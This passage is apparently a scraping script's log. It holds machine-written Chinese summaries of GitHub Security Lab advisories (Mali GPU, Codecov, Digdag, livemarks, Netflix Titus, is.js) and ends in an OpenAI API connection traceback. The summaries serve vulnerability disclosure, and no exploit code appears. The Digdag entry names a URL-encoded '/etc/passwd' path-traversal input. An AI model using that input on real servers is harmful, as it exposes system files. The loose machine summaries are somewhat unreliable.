+  - 在扩展内存时，临时放弃了两把锁（`kbase_gpu_vm_lock` 和 `mem_partials_lock`）。
+  - 这段时间，GPU 页故障可能会尝试分配内存，进而可能修改 JIT 内存区域。
+
+- **影响**: 
+  - 改变了已提交页面的数量，导致后续操作时的内存大小不一致。
+  - 攻击者可利用此漏洞，允许不受信任的应用程序执行任意内核代码。
+  - 即使启用了内存标记扩展（MTE），此漏洞仍然可以被利用。
+
+## 报告与联系
+此问题由GHSL团队成员@m-y-mo（Man Yue Mo）发现并报告。
+
+如需进一步信息，请通过 email 联系 GHSL 团队: securitylab@github.com，并在邮件中提及 GHSL-2023-224。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2023_224_Arm_Mali_GPU_Driver_Memory_Vulnerab_f1443759.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-224_Arm_Mali/
+# GHSL-2020-109: Codecov中的命令注入漏洞
+
+## 概述
+
+在Codecov的upload方法中发现了一个命令注入漏洞。使用`codecov-node`库的用户可能并未意识到这个问题，这可能导致他们无意中编写含有漏洞的代码。
+
+## 漏洞细节
+
+### 影响版本
+
+- Commit: **eeff4e1**   
+
+### 漏洞证明
+
+1. 首先安装`codecov`。
+2. 创建一个包含特定内容的文件。
+3. 运行该文件。
+
+运行后，会创建一个名为`exploit`的文件。
+
+### 注意事项
+
+我们知道CVE-2020-7597的存在，但修复措施不彻底。它只屏蔽了`&`字符，而我们的证明概念代码使用了反引号（```）来绕过这个过滤器。
+
+### 潜在风险
+
+如果库的客户使用不受信任的输入调用这个漏洞的方法，可能会导致远程代码执行的风险。
+
+## 安全建议
+
+建议避免使用可能将字符串解释为shell命令的API。例如，使用`child_process.execFile`而不是`child_process.exec`。
+
+## 报告人
+
+这一问题由GitHub工程师**@erik-krogh（Erik Krogh Kristensen）**发现并报告。
+
+## 联系方式
+
+如需进一步信息，请通过安全邮箱联系GHSL团队：securitylab@github.com，并在任何相关通讯中提及**GHSL-2020-109**。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2020_109_Codecov中的命令注入漏洞_3c46b107.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2020-109-codecov/
+# GHSL-2023-221: Path Traversal Vulnerability in Digdag - CVE-2024-25125
+
+## 概述
+Treasure Data 的 digdag 工作负载自动化系统存在一个路径遍历漏洞。该漏洞发生在将日志文件配置为本地存储时。
+
+## 技术细节
+- **受影响版本**: digdag v0.10.5
+- **漏洞类型**: 路径遍历（Path Traversal）
+
+### 漏洞原理
+1. **API 方法**: `getFile` - 该方法接受一个 `filename` 参数。
+2. **文件存储方式**: 当 digdag 使用 `--task-log` 参数配置为本地存储日志时，创建一个 `LocalFileLogServerFactory` 实例。
+3. **无效检查**: 用户提供的 `filename` 参数经过的检查不够严格。
+4. **路径解析**: `java.nio.file.Path` 的 `resolve` 方法可以接收绝对路径，例子为 URL 编码的路径（如 `%2fetc%2fpasswd`）。这些路径可以绕过常见的安全过滤器。
+
+### 漏洞影响
+- 导致**信息泄露**，可能被恶意用户利用来访问敏感文件。
+
+### 报告与联系
+- 该漏洞由 GHSL 团队成员 @p-（Peter Stöckli）发现并报告。
+- 如需更多信息，请联系 GHSL 团队：securitylab@github.com，并在沟通中提及 GHSL-2023-221。
+Folder '信息泄露' already exists.
+信息泄露
+内容已保存至 信息泄露/GHSL_2023_221_Path_Traversal_Vulnerability_in_Dig_10e7c383.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-221_digdag/
+# GHSL-2024-015: 浏览器扩展 livemarks 中的跨站请求伪造 (CSRF) - CVE-2024-30252
+
+## 概述
+
+livemarks 浏览器扩展存在 CSRF 漏洞。恶意网站可以诱使此扩展向任意 URL 发送已认证的 GET 请求。
+
+### 主要组件
+
+- **livemarks 版本**: 3.6
+- **关键脚本**: 
+    - `subscribe.js`: 处理 RSS 订阅，使用当前 URL 的参数作为 RSS 源，并验证其是否为有效的 XML。
+    - `feed-parser.js`: 用于解析 RSS 数据。
+- **权限配置**: `manifest.json` 文件定义了哪些资源可以被外部网站访问。
+
+## 漏洞影响
+
+该漏洞可能导致特权升级。盲目 CSRF 攻击会破坏在私有网络上运行服务器的完整性。用户可能在浏览器扩展中有一个私有服务器，假定它是安全的，但如果接收到来自攻击者的认证请求，安全性将受到威胁。
+
+## 利用此漏洞的条件
+
+- **UUID 泄露**: 攻击者需要获取扩展的 UUID 信息，该扩展仅适用于 Firefox。
+- **操作方式**: 
+    - 攻击者可以诱骗用户安装附加扩展，这个扩展具备某些权限（如管理权限），但不直接允许发送认证请求。
+    - 一旦 UUID 泄露，攻击者可以通过 CSRF 攻击发送 SameSite cookie（因为 livemarks 对所有 URL 拥有权限）。
+
+## 攻击示例
+
+1. **托管恶意 HTML**: 攻击者托管一个 HTML 页面。
+2. **诱导用户访问**: 用户访问该 HTML 页面，并激活 livemarks 扩展，最终导致向攻击者提供的域名发送已认证的请求。
+
+## 联系信息
+
+此漏洞由 GHSL 团队成员 @Kwstubbs（Kevin Stubbings）发现并报告。如需联系 GHSL 团队，请通过 securitylab@github.com 发送邮件，并在沟通中提及 GHSL-2024-015。
+Folder 'CSRF' already exists.
+CSRF
+内容已保存至 CSRF/GHSL_2024_015_浏览器扩展_livemarks_中的跨站请求伪造_CSRF_C_84bf64d6.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-015_livemarks/
+# GHSL-2020-028: Netflix Titus中的服务器端模板注入漏洞
+
+## 概述
+在Netflix Titus中发现了一种**服务器端模板注入**漏洞。这一漏洞允许攻击者注入任意的Java EL（表达式语言）表达式，从而导致**远程代码执行（RCE）**漏洞。
+
+- **CVE编号**: CVE-2020-9297
+- **受影响版本**: Netflix Titus v0.1.1-rc.263
+
+## 技术细节
+- **漏洞类型**: 服务器端模板注入
+- **攻击方式**: 攻击者可以通过自定义约束验证器注入错误信息模板中的任意Java EL表达式，进而在服务器上执行任意代码（使用Titus服务账户的权限）。
+
+### 背景知识
+- Netflix Titus使用Java Bean Validation（JSR 380）和自定义约束验证器。
+- 在构建自定义约束违例错误信息时，验证器会支持不同类型的插值，包括Java EL表达式。
+- 如果攻击者能够注入任意数据到 `ConstraintValidatorContext.buildConstraintViolationWithTemplate()` 函数的参数中，就可以执行任意Java代码。
+- 经过分析，我们发现多个路径可以进入 `ConstraintValidatorContext.buildConstraintViolationWithTemplate()`。
+
+## 风险与解决方案
+这个问题可能导致远程代码执行。为了解决此问题，可以采取不同的方法。
+
+## 联系信息
+- 本报告遵循GHSL协调披露政策。
+- 此问题由GHSL团队成员@pwntester（Alvaro Muñoz）发现并报告。感谢Hibernate Validator团队的Guillaume Smet提供的修复建议。
+- 如果有任何问题，请联系GHSL团队：securitylab@github.com，邮件中请包含GHSL-YEAR-ID。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2020_028_Netflix_Titus中的服务器端模板注入漏洞_c0dd7455.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2020-028-netflix-titus/
+# GHSL-2020-295: ReDoS (正则表达式拒绝服务) 在 is.js 中 - CVE-2020-26302
+
+## 概述
+该项目中的一个或多个正则表达式存在 ReDoS 漏洞。ReDoS 是一种安全漏洞，可能导致由于不良构造的正则表达式在处理特定输入时性能极其差。
+
+## 正则表达式拒绝服务 (ReDoS)
+- **ReDoS**：当正则表达式效率低下或者结构复杂时，可能会导致在处理特定字符串时运行时间呈指数级增长（O(2^n)）。
+- 这种问题通常源于正则表达式中的模糊性或重叠。
+
+## 示例与修复方式
+### 示例1: HTML 注释
+- **漏洞正则**：匹配 HTML 注释的开始、任意字符和结束。
+- **问题**：区分空格的方式过于灵活，导致在输入为 `<!--    ` 时，正则表达式程序会尝试多种匹配方式，耗时过长。
+- **修复**：通过减少模糊性，确保正则表达式没有重叠。
+
+### 示例2: snake_case 标识符
+- **漏洞正则**：匹配以字母开头的snake_case 标识符。
+- **问题**：正则结构中重复部分引入了多个匹配方式。
+- **修复**：减少模糊性，确保内部的重复结构不再引起冲突。
+
+## 实际案例
+is.js 使用了一个从其他地方复制的正则表达式来验证 URL。如果输入恶意字符串，可能导致正则表达式“无限循环”。这个漏洞是通过 CodeQL 查询发现的。
+
+## 影响
+此问题可能导致拒绝服务攻击。
+
+## 报告人
+该漏洞由 GitHub 团队成员 @erik-krogh 发现并报告。
+
+有关此问题的更多信息，可以联系 GHSL 团队，邮箱为 securitylab@github.com，请在任何通信中提及 GHSL-2020-295。
+Folder '正则表达式拒绝服务' already exists.
+正则表达式拒绝服务
+内容已保存至 正则表达式拒绝服务/GHSL_2020_295_ReDoS_正则表达式拒绝服务_在_is_js_中_CVE_2_c2d0ba14.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2020-295-redos-is.js/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.13/site-packages/httpx/_transports/default.py", line 72, in map_httpcore_exceptions
+    yield
+  File "/usr/local/lib/python3.13/site-packages/httpx/_transports/default.py", line 236, in handle_request
+    resp = self._pool.handle_request(req)
+  File "/usr/local/lib/python3.13/site-packages/httpcore/_sync/connection_pool.py", line 216, in handle_request
+    raise exc from None
+  File "/usr/local/lib/python3.13/site-packages/httpcore/_sync/connection_pool.py", line 196, in handle_request
+    response = connection.handle_request(
+        pool_request.request
+    )
+  File "/usr/local/lib/python3.13/site-packages/httpcore/_sync/http_proxy.py", line 317, in handle_request
+    stream = stream.start_tls(**kwargs)
+  File "/usr/local/lib/python3.13/site-packages/httpcore/_sync/http11.py", line 383, in start_tls
+    return self._stream.start_tls(ssl_context, server_hostname, timeout)
+           ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.13/site-packages/httpcore/_backends/sync.py", line 152, in start_tls
+    with map_exceptions(exc_map):
+         ~~~~~~~~~~~~~~^^^^^^^^^
+  File "/usr/local/Cellar/python@3.13/3.13.0_1/Frameworks/Python.framework/Versions/3.13/lib/python3.13/contextlib.py", line 162, in __exit__
+    self.gen.throw(value)
+    ~~~~~~~~~~~~~~^^^^^^^
+  File "/usr/local/lib/python3.13/site-packages/httpcore/_exceptions.py", line 14, in map_exceptions
+    raise to_exc(exc) from exc
+httpcore.ConnectError: [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation of protocol (_ssl.c:1020)
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.13/site-packages/openai/_base_client.py", line 991, in _request
+    response = self._client.send(
+        request,
+        stream=stream or self._should_stream_response_body(request=request),
+        **kwargs,
+    )
+  File "/usr/local/lib/python3.13/site-packages/httpx/_client.py", line 926, in send
+    response = self._send_handling_auth(
+        request,
+    ...<2 lines>...
+        history=[],
+    )
+  File "/usr/local/lib/python3.13/site-packages/httpx/_client.py", line 954, in _send_handling_auth
+    response = self._send_handling_redirects(
+        request,
+        follow_redirects=follow_redirects,
+        history=history,
+    )
+  File "/usr/local/lib/python3.13/site-packages/httpx/_client.py", line 991, in _send_handling_redirects
+    response = self._send_single_request(request)
+  File "/usr/local/lib/python3.13/site-packages/httpx/_client.py", line 1027, in _send_single_request
+    response = transport.handle_request(request)
+  File "/usr/local/lib/python3.13/site-packages/httpx/_transports/default.py", line 235, in handle_request
+    with map_httpcore_exceptions():
+         ~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/usr/local/Cellar/python@3.13/3.13.0_1/Frameworks/Python.framework/Versions/3.13/lib/python3.13/contextlib.py", line 162, in __exit__
+    self.gen.throw(value)
+    ~~~~~~~~~~~~~~^^^^^^^
+  File "/usr/local/lib/python3.13/site-packages/httpx/_transports/default.py", line 89, in map_httpcore_exceptions
+    raise mapped_exc(message) from exc
+httpx.ConnectError: [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation of protocol (_ssl.c:1020)
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/Users/a0000/mywork/commonLLM/opensource/nnnew/freebuf_data/main.py", line 167, in <module>
+    main()
+    ~~~~^^
+  File "/Users/a0000/mywork/commonLLM/opensource/nnnew/freebuf_data/main.py", line 155, in main
+    processed_content=convert_with_openai(content)
+  File "/Users/a0000/mywork/commonLLM/opensource/nnnew/freebuf_data/_convert_content_with_openai.py", line 63, in convert_with_openai
+    completion = client.chat.completions.create(
+        model="gpt-4o-mini",
+    ...<2 lines>...
+        ]
+    )
+  File "/usr/local/lib/python3.13/site-packages/openai/_utils/_utils.py", line 275, in wrapper
+    return func(*args, **kwargs)
+  File "/usr/local/lib/python3.13/site-packages/openai/resources/chat/completions.py", line 829, in create
+    return self._post(
+           ~~~~~~~~~~^
+        "/chat/completions",
+        ^^^^^^^^^^^^^^^^^^^^
+    ...<39 lines>...
+        stream_cls=Stream[ChatCompletionChunk],
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File "/usr/local/lib/python3.13/site-packages/openai/_base_client.py", line 1278, in post
+    return cast(ResponseT, self.request(cast_to, opts, stream=stream, stream_cls=stream_cls))
+                           ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.13/site-packages/openai/_base_client.py", line 955, in request
+    return self._request(
+           ~~~~~~~~~~~~~^
+        cast_to=cast_to,
+        ^^^^^^^^^^^^^^^^
+    ...<3 lines>...
+        retries_taken=retries_taken,
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File "/usr/local/lib/python3.13/site-packages/openai/_base_client.py", line 1015, in _request
+    return self._retry_request(
+           ~~~~~~~~~~~~~~~~~~~^
+        input_options,
+        ^^^^^^^^^^^^^^
+    ...<4 lines>...
+        response_headers=None,
+        ^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File "/usr/local/lib/python3.13/site-packages/openai/_base_client.py", line 1093, in _retry_request
+    return self._request(
+           ~~~~~~~~~~~~~^
+        options=options,
+        ^^^^^^^^^^^^^^^^
+    ...<3 lines>...
+        stream_cls=stream_cls,
+        ^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File "/usr/local/lib/python3.13/site-packages/openai/_base_client.py", line 1015, in _request
+    return self._retry_request(
+           ~~~~~~~~~~~~~~~~~~~^
+        input_options,
+        ^^^^^^^^^^^^^^
+    ...<4 lines>...
+        response_headers=None,
+        ^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File "/usr/local/lib/python3.13/site-packages/openai/_base_client.py", line 1093, in _retry_request
+    return self._request(
+           ~~~~~~~~~~~~~^
+        options=options,
+        ^^^^^^^^^^^^^^^^
+    ...<3 lines>...
+        stream_cls=stream_cls,
+        ^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File "/usr/local/lib/python3.13/site-packages/openai/_base_client.py", line 1025, in _request
+    raise APIConnectionError(request=request) from err
+openai.APIConnectionError: Connection error.
